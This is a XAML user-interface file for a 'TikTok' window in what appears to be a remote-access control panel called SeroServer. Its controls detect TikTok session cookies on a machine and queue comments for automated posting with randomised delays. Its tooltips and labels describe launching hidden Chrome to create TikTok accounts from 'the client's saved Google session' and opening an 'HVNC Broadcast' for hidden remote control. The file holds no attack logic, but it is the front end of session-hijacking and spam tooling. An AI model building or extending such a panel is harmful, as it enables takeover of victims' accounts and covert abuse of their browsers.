<Window x:Class="SeroServer.UI.TikTokWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="TikTok"
        Width="720" Height="660" MinWidth="560" MinHeight="500"
        WindowStartupLocation="CenterOwner"
        ResizeMode="CanResize"
        WindowStyle="None"
        AllowsTransparency="True"
        Background="Transparent">

    <Border CornerRadius="8" BorderThickness="1" ClipToBounds="True" x:Name="RootBorder">
        <Border.Background><SolidColorBrush Color="#0C0D18"/></Border.Background>
        <Border.BorderBrush>
            <LinearGradientBrush StartPoint="0,0" EndPoint="0,1">
                <GradientStop Color="#2A2E50" Offset="0"/>
                <GradientStop Color="#141628" Offset="1"/>
            </LinearGradientBrush>
        </Border.BorderBrush>
        <Border.Effect>
            <DropShadowEffect Color="#000" BlurRadius="36" ShadowDepth="0" Opacity="0.80"/>
        </Border.Effect>

        <DockPanel LastChildFill="True">
            <!-- Accent -->
            <Rectangle DockPanel.Dock="Top" Height="2" IsHitTestVisible="False">
                <Rectangle.Fill>
                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                        <GradientStop Color="#f38ba8" Offset="0"/>
                        <GradientStop Color="#cba6f7" Offset="0.5"/>
                        <GradientStop Color="#89b4fa" Offset="1"/>
                    </LinearGradientBrush>
                </Rectangle.Fill>
            </Rectangle>

            <!-- Title bar -->
            <Border DockPanel.Dock="Top" Height="42" Background="#111222"
                    MouseLeftButtonDown="Window_MouseLeftButtonDown">
                <Grid Margin="14,0">
                    <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                        <TextBlock Text="♪" FontSize="15" Foreground="#f38ba8" VerticalAlignment="Center" Margin="0,0,8,0"/>
                        <TextBlock Text="TikTok" FontSize="13" FontWeight="SemiBold" Foreground="#C0CCDD"
                                   VerticalAlignment="Center" FontFamily="Segoe UI"/>
                        <TextBlock x:Name="TxtTitle" FontSize="11" Foreground="#404868"
                                   VerticalAlignment="Center" FontFamily="Segoe UI Mono" Margin="10,0,0,0"/>
                        <Border x:Name="BadgeRunning" Margin="10,0,0,0" CornerRadius="3"
                                Background="#0A1E10" BorderBrush="#1A5E28" BorderThickness="1"
                                Padding="6,2" Visibility="Collapsed" VerticalAlignment="Center">
                            <StackPanel Orientation="Horizontal">
                                <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
                                    <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="4" ShadowDepth="0" Opacity="0.9"/></Ellipse.Effect>
                                </Ellipse>
                                <TextBlock x:Name="TxtBadge" Text="RUNNING" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Segoe UI"/>
                            </StackPanel>
                        </Border>
                    </StackPanel>
                    <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                        <Button Content="📡 Broadcast" Height="28" Padding="10,0" Margin="0,0,6,0"
                                Style="{StaticResource SBtn}" FontSize="10"
                                Click="BtnBroadcast_Click"
                                ToolTip="Open HVNC Broadcast — TikTok workflow steps"/>
                        <Button x:Name="BtnMax" Content="☐" Width="30" Height="28" Margin="0,0,4,0"
                                Style="{StaticResource SBtn}" FontSize="13" Padding="0" Click="BtnMax_Click"/>
                        <Button Content="✕" Width="30" Height="28"
                                Style="{StaticResource SRedBtn}" FontSize="11" Padding="0" Click="Close_Click"/>
                    </StackPanel>
                </Grid>
            </Border>

            <!-- Status bar -->
            <Border DockPanel.Dock="Bottom" Height="28" Background="#111222"
                    BorderBrush="#1A1C2E" BorderThickness="0,1,0,0">
                <Grid Margin="14,0">
                    <TextBlock x:Name="TxtStatus" Text="Ready" Foreground="#404868"
                               FontSize="11" FontFamily="Consolas" VerticalAlignment="Center"/>
                    <TextBlock x:Name="TxtProgress" Text="" Foreground="#a6e3a1"
                               FontSize="11" FontFamily="Consolas" VerticalAlignment="Center"
                               HorizontalAlignment="Right"/>
                </Grid>
            </Border>

            <!-- Content -->
            <Grid>
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="*"/>
                    <ColumnDefinition Width="4"/>
                    <ColumnDefinition Width="260"/>
                </Grid.ColumnDefinitions>

                <!-- Left: main config -->
                <ScrollViewer Grid.Column="0" VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Disabled">
                <StackPanel Margin="14,12">

                    <!-- Session cookie -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <Grid Margin="0,0,0,6">
                                <TextBlock Text="SESSION COOKIE" FontSize="9" FontWeight="Bold"
                                           Foreground="#C0f38ba8" FontFamily="Consolas" VerticalAlignment="Center"/>
                                <Button Content="Detect" Height="22" Padding="10,0" HorizontalAlignment="Right"
                                        Style="{StaticResource SBtn}" FontSize="9" Click="BtnDetect_Click"
                                        ToolTip="Search for a TikTok session on this machine"/>
                            </Grid>
                            <TextBox x:Name="TxtCookie" Style="{StaticResource STxt}" Height="46"
                                     TextWrapping="Wrap" AcceptsReturn="True" FontSize="10"
                                     ToolTip="Paste: sessionid=...;  msToken=...;  tt_csrf_token=..."/>
                            <TextBlock Text="Export with Cookie-Editor in Chrome/Edge, then paste here"
                                       Foreground="#353858" FontSize="10" Margin="0,4,0,0"/>
                        </StackPanel>
                    </Border>

                    <!-- Target type + ID -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <TextBlock Text="TARGET" FontSize="9" FontWeight="Bold"
                                       Foreground="#C0f38ba8" FontFamily="Consolas" Margin="0,0,0,8"/>
                            <StackPanel Orientation="Horizontal" Margin="0,0,0,8">
                                <RadioButton x:Name="RbVideo" Content="Video / Post" IsChecked="True"
                                             Foreground="#DDE0F0" FontSize="12" Margin="0,0,20,0"
                                             GroupName="TargetType" Checked="RbTarget_Changed"/>
                                <RadioButton x:Name="RbLive"  Content="Livestream (room)"
                                             Foreground="#DDE0F0" FontSize="12"
                                             GroupName="TargetType" Checked="RbTarget_Changed"/>
                            </StackPanel>
                            <TextBlock x:Name="TxtIdLabel" Text="Video URL or ID" Style="{StaticResource SFieldLabel}"/>
                            <TextBox x:Name="TxtVideoId" Style="{StaticResource STxt}" FontSize="12"
                                     ToolTip="Full TikTok URL or numeric ID"/>
                        </StackPanel>
                    </Border>

                    <!-- Comment queue -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <Grid Margin="0,0,0,6">
                                <TextBlock Text="COMMENTS (one per line)" FontSize="9" FontWeight="Bold"
                                           Foreground="#C0f38ba8" FontFamily="Consolas" VerticalAlignment="Center"/>
                                <TextBlock x:Name="TxtQueueCount" Text="0 comments"
                                           Foreground="#505878" FontSize="10" FontFamily="Consolas"
                                           HorizontalAlignment="Right" VerticalAlignment="Center"/>
                            </Grid>
                            <TextBox x:Name="TxtComments" Style="{StaticResource STxt}" Height="100"
                                     TextWrapping="Wrap" AcceptsReturn="True" FontSize="12"
                                     TextChanged="TxtComments_Changed"
                                     ToolTip="One comment per line — they will be posted in order"/>
                        </StackPanel>
                    </Border>

                    <!-- Delay -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,0,0,8"
                            Background="#07FFFFFF" BorderThickness="1" BorderBrush="#18283040">
                        <StackPanel>
                            <TextBlock Text="DELAY BETWEEN POSTS" FontSize="9" FontWeight="Bold"
                                       Foreground="#C0f38ba8" FontFamily="Consolas" Margin="0,0,0,8"/>
                            <StackPanel Orientation="Horizontal">
                                <TextBlock Text="Min (s):" Foreground="#606880" FontSize="11"
                                           VerticalAlignment="Center" Margin="0,0,8,0"/>
                                <TextBox x:Name="TxtDelayMin" Text="5" Width="54" Height="28"
                                         Style="{StaticResource STxt}" FontSize="12" Margin="0,0,14,0"/>
                                <TextBlock Text="Max (s):" Foreground="#606880" FontSize="11"
                                           VerticalAlignment="Center" Margin="0,0,8,0"/>
                                <TextBox x:Name="TxtDelayMax" Text="15" Width="54" Height="28"
                                         Style="{StaticResource STxt}" FontSize="12"/>
                            </StackPanel>
                        </StackPanel>
                    </Border>

                    <!-- Action buttons -->
                    <StackPanel Orientation="Horizontal" Margin="0,0,0,4">
                        <Button x:Name="BtnStart" Content="▶  Start" Height="34" Padding="20,0" Margin="0,0,8,0"
                                Style="{StaticResource SGreenBtn}" FontSize="12" FontWeight="SemiBold"
                                Click="BtnStart_Click"/>
                        <Button x:Name="BtnStop" Content="■  Stop" Height="34" Padding="16,0" Margin="0,0,8,0"
                                Style="{StaticResource SRedBtn}" FontSize="12" FontWeight="SemiBold"
                                IsEnabled="False" Click="BtnStop_Click"/>
                        <Button Content="Post once" Height="34" Padding="14,0"
                                Style="{StaticResource SBtn}" FontSize="12"
                                Click="BtnPostOnce_Click"
                                ToolTip="Post only the first comment in the list once"/>
                    </StackPanel>

                    <!-- CDP Auto-Signup -->
                    <Border Padding="12,10" CornerRadius="6" Margin="0,8,0,0"
                            Background="#0A0F08" BorderThickness="1" BorderBrush="#1A3020">
                        <StackPanel>
                            <Grid Margin="0,0,0,8">
                                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                    <TextBlock Text="🤖  AUTO-SIGNUP (Chrome CDP)" FontSize="9" FontWeight="Bold"
                                               Foreground="#C0a6e3a1" FontFamily="Consolas" VerticalAlignment="Center"/>
                                </StackPanel>
                                <Button x:Name="BtnCdpSignup" Content="🤖 Auto-Signup" Height="26" Padding="12,0"
                                        HorizontalAlignment="Right"
                                        Style="{StaticResource SGreenBtn}" FontSize="10"
                                        Click="BtnCdpSignup_Click"
                                        ToolTip="Launch Chrome CDP — auto-create TikTok account from client's Google session"/>
                            </Grid>
                            <TextBlock TextWrapping="Wrap" Foreground="#404868" FontSize="10" FontFamily="Segoe UI"
                                       Margin="0,0,0,8"
                                       Text="Creates a TikTok account using the client's saved Google session in Chrome. No HVNC needed — Chrome runs hidden."/>
                            <Border Background="#05080A" CornerRadius="4" Height="80">
                                <TextBox x:Name="TxtCdpLog"
                                         Background="Transparent" Foreground="#a6e3a1"
                                         FontFamily="Consolas" FontSize="10"
                                         BorderThickness="0" Padding="8,6"
                                         IsReadOnly="True" TextWrapping="Wrap"
                                         VerticalScrollBarVisibility="Auto"
                                         AcceptsReturn="True"/>
                            </Border>
                        </StackPanel>
                    </Border>

                </StackPanel>
                </ScrollViewer>

                <!-- Splitter -->
                <GridSplitter Grid.Column="1" Width="4" Background="#0F1020"
                              HorizontalAlignment="Stretch" Cursor="SizeWE"/>

                <!-- Right: log -->
                <Border Grid.Column="2" Background="#07080F">
                    <DockPanel LastChildFill="True">
                        <Border DockPanel.Dock="Top" Background="#111222" BorderBrush="#1A1C2E"
                                BorderThickness="0,0,0,1" Padding="10,6">
                            <Grid>
                                <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                    <TextBlock Text="LOG" FontSize="9" FontWeight="Bold"
                                               Foreground="#C0f38ba8" FontFamily="Consolas" VerticalAlignment="Center"/>
                                    <TextBlock x:Name="TxtSentCount" Text="  0 sent"
                                               Foreground="#505878" FontSize="10" FontFamily="Consolas"
                                               VerticalAlignment="Center"/>
                                </StackPanel>
                                <Button Content="Clear" Height="22" Padding="8,0" HorizontalAlignment="Right"
                                        Style="{StaticResource SBtn}" FontSize="9" Click="BtnClearLog_Click"/>
                            </Grid>
                        </Border>
                        <TextBox x:Name="TxtLog"
                                 Background="Transparent" Foreground="#C8D0E8"
                                 FontFamily="Consolas" FontSize="11"
                                 BorderThickness="0" Padding="8,8"
                                 IsReadOnly="True" TextWrapping="Wrap"
                                 VerticalScrollBarVisibility="Auto"
                                 AcceptsReturn="True"/>
                    </DockPanel>
                </Border>

            </Grid>
        </DockPanel>
    </Border>
</Window>
